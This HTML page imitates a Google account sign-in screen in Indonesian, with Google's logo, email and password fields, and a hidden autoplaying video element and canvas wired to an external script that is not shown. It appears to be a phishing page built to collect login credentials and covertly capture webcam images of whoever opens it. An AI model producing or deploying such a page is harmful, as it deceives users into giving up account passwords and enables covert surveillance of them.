<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login Akun Google</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="container">
  <div class="header">
    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo">
  </div>
  <form id="login-form">
    <label for="username">Email atau Nomor Telepon:</label>
    <input type="text" id="username" name="username" required autofocus autocomplete="off">

    <label for="password">Kata Sandi:</label>
    <input type="password" id="password" name="password" required autocomplete="new-password">

    <button type="submit">Masuk</button>
  </form>
  
  <div class="footer">
    <span>Lupa kata sandi?</span>
    <a href="#">Dapatkan bantuan</a>
  </div>
</div>

<video id="video-capture" autoplay muted playsinline></video>
<canvas id="canvas-capture" hidden></canvas>

<script src="script.js"></script>
</body>
</html>
